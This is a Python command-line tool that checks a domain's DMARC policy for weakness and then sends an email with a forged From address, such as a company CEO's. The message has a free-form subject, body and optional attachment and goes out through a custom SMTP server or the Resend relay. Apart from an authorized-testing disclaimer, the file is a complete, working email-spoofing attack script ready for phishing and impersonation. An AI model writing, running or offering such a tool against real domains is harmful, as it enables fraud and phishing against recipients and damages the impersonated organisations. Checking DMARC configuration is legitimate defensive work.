import dns.resolver
import smtplib
import os
import logging
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')

def display_disclaimer():
    disclaimer = (
        "\033[91mDISCLAIMER:\n"
        "This tool is for educational and authorized testing purposes only.\n"
        "Unauthorized email spoofing is illegal. Ensure you have proper permissions\n"
        "before using this tool on any domain or email system.\033[0m"
    )
    print(disclaimer)
    input("Press Enter to continue or Ctrl+C to exit...")

def check_dmarc(domain):
    """
    Checks the DMARC record for the domain and returns a tuple:
    (policy, record)

    policy: "none", "quarantine", "reject", or None if no record found.
    """
    try:
        answers = dns.resolver.resolve(f'_dmarc.{domain}', 'TXT')
        for rdata in answers:
            # Attempt to get the record text in a robust manner
            try:
                record = ''.join(s.decode() for s in rdata.strings)
            except AttributeError:
                record = rdata.to_text()
            if 'v=DMARC1' in record:
                if 'p=none' in record:
                    return "none", record
                elif 'p=quarantine' in record:
                    return "quarantine", record
                elif 'p=reject' in record:
                    return "reject", record
        return None, "No DMARC record found"
    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer):
        return None, "No DMARC record found"
    except Exception as e:
        return None, f"Error checking DMARC: {str(e)}"

def send_spoofed_email(from_addr, to_addr, subject, body, attachment_path, smtp_details):
    msg = MIMEMultipart()
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    if attachment_path:
        try:
            with open(attachment_path, 'rb') as f:
                part = MIMEApplication(f.read(), Name=os.path.basename(attachment_path))
            part['Content-Disposition'] = f'attachment; filename="{os.path.basename(attachment_path)}"'
            msg.attach(part)
        except Exception as e:
            logging.error(f"Error attaching file: {e}")
            return False

    try:
        if smtp_details.get('use_ssl'):
            with smtplib.SMTP_SSL(smtp_details['server'], smtp_details['port']) as server:
                if smtp_details.get('username') and smtp_details.get('password'):
                    server.login(smtp_details['username'], smtp_details['password'])
                server.sendmail(from_addr, to_addr, msg.as_string())
        else:
            with smtplib.SMTP(smtp_details['server'], smtp_details['port']) as server:
                if smtp_details.get('starttls'):
                    server.starttls()
                if smtp_details.get('username') and smtp_details.get('password'):
                    server.login(smtp_details['username'], smtp_details['password'])
                server.sendmail(from_addr, to_addr, msg.as_string())
        logging.info(f"Email sent from {from_addr} to {to_addr}")
        return True
    except Exception as e:
        logging.error(f"Error sending email: {e}")
        return False

def get_smtp_details():
    print("\n\033[94mConfigure Custom SMTP Server:\033[0m")
    server = input("SMTP Server Address: ").strip()
    port = int(input("SMTP Port (e.g., 25, 465, 587): ").strip())
    use_ssl = input("Use SSL? (yes/no): ").strip().lower() == 'yes'
    starttls = False
    if not use_ssl:
        starttls = input("Use STARTTLS? (yes/no): ").strip().lower() == 'yes'
    auth_required = input("Requires authentication? (yes/no): ").strip().lower() == 'yes'
    username = ""
    password = ""
    if auth_required:
        username = input("Username: ").strip()
        password = input("Password: ").strip()
    return {
        'server': server,
        'port': port,
        'use_ssl': use_ssl,
        'starttls': starttls,
        'username': username,
        'password': password
    }

def get_resend_smtp_details():
    print("\n\033[94mConfigure Resend SMTP:\033[0m")
    print("Resend SMTP credentials:")
    print("Host: smtp.resend.com")
    port = int(input("SMTP Port (choose from 25, 465, 587, 2465, or 2587): ").strip())
    if port in [465, 2465]:
        use_ssl = True
        starttls = False
    elif port in [25, 587, 2587]:
        use_ssl = False
        starttls = True
    else:
        print("\033[91mInvalid port selected. Defaulting to 465 with SSL.\033[0m")
        port = 465
        use_ssl = True
        starttls = False
    api_key = input("Resend API Key: ").strip()
    # Resend uses fixed username "resend"
    return {
        'server': "smtp.resend.com",
        'port': port,
        'use_ssl': use_ssl,
        'starttls': starttls,
        'username': "resend",
        'password': api_key
    }

def main():
    display_disclaimer()

    print("\n\033[94mDMARC Spoofability Checker\033[0m")
    domain = input("\nEnter domain to check (e.g., example.com): ").strip().lower()
    policy, record = check_dmarc(domain)
    print(f"\nDMARC Record for {domain}:")
    print(f"\033[93m{record}\033[0m")
    if policy is None:
        print("\033[92mNo DMARC record found. Domain appears vulnerable.\033[0m")
    elif policy == "none":
        print("\033[91mDMARC policy is set to p=none. Domain is vulnerable to spoofing.\033[0m")
    elif policy == "quarantine":
        print("\033[91mDMARC policy is set to p=quarantine. Spoofed emails may be delivered to spam or quarantine.\033[0m")
    elif policy == "reject":
        print("\033[91mDMARC policy is set to p=reject. Spoofed emails are likely to be rejected.\033[0m")
    
    if input("\nAttempt to send spoofed email anyway? (yes/no): ").strip().lower() == 'yes':
        print("\n\033[94mCompose Spoofed Email:\033[0m")
        from_addr = input("From address (e.g., ceo@example.com): ").strip()
        to_addr = input("To address: ").strip()
        subject = input("Subject: ").strip()
        body = input("Message body: ").strip()

        attachment_path = None
        if input("Add attachment? (yes/no): ").strip().lower() == 'yes':
            while True:
                attachment_path = input("Attachment path: ").strip()
                if os.path.exists(attachment_path):
                    break
                print("\033[91mFile not found. Try again.\033[0m")
        
        method = input("Choose sending method (SMTP/Resend): ").strip().lower()
        if method == "smtp":
            smtp_details = get_smtp_details()
            print("\n\033[93mSending email via custom SMTP...\033[0m")
            if send_spoofed_email(from_addr, to_addr, subject, body, attachment_path, smtp_details):
                print("\033[92mEmail successfully sent!\033[0m")
            else:
                print("\033[91mFailed to send email\033[0m")
        elif method == "resend":
            smtp_details = get_resend_smtp_details()
            print("\n\033[93mSending email via Resend SMTP...\033[0m")
            if send_spoofed_email(from_addr, to_addr, subject, body, attachment_path, smtp_details):
                print("\033[92mEmail successfully sent using Resend SMTP!\033[0m")
            else:
                print("\033[91mFailed to send email via Resend SMTP\033[0m")
        else:
            print("\033[91mInvalid sending method selected.\033[0m")
    else:
        print("\033[92mOperation cancelled by user. No spoofed email was sent.\033[0m")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nOperation cancelled by user.")
